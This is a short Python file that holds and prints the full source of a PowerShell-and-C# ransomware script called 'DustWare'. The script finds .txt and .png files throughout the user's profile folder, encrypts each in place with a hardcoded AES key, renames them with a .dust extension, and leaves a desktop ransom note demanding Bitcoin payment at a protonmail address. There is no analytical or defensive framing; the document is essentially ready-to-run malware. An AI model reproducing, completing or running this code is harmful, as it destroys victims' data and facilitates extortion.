x = """

# ================= AES Config =================
$AESKey = "YkU7gH3kLp9sTmVzR2dJ5qW6mA0xZc8B"  # 32-byte key
$AESIV = New-Object Byte[] (16) # 16-byte null IV

# ================== File Finder ==================
$extensions = @(".txt", ".png")
$targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
    $extensions -contains $_.Extension.ToLower()
} | Select-Object -ExpandProperty FullName

# ================= Embed C# =================
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

public class CryptoDust {
    public static void EncryptFiles(string[] files, string key) {
        byte[] aesKey = Encoding.UTF8.GetBytes(key);
        byte[] aesIV = new byte[16];

        foreach (string path in files) {
            try {
                byte[] fileBytes = File.ReadAllBytes(path);
                using (Aes aes = Aes.Create()) {
                    aes.Key = aesKey;
                    aes.IV = aesIV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (ICryptoTransform encryptor = aes.CreateEncryptor()) {
                        byte[] encBytes = encryptor.TransformFinalBlock(fileBytes, 0, fileBytes.Length);
                        File.WriteAllBytes(path, encBytes);
                        File.Move(path, path + ".dust");
                    }
                }
            } catch { /* ignore */ }
        }

        string note = @"Your files have been encrypted by DustWare.

Send 0.05 BTC to 1A2b3C4d5E6f7G8h9i0JdustWallet
Contact: dust@protonmail.com";
        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        File.WriteAllText(Path.Combine(desktop, "READ_ME.txt"), note);
    }
}
"@

# ================== Run C# ==================
[CryptoDust]::EncryptFiles($targetFiles, $AESKey)




"""
print(x)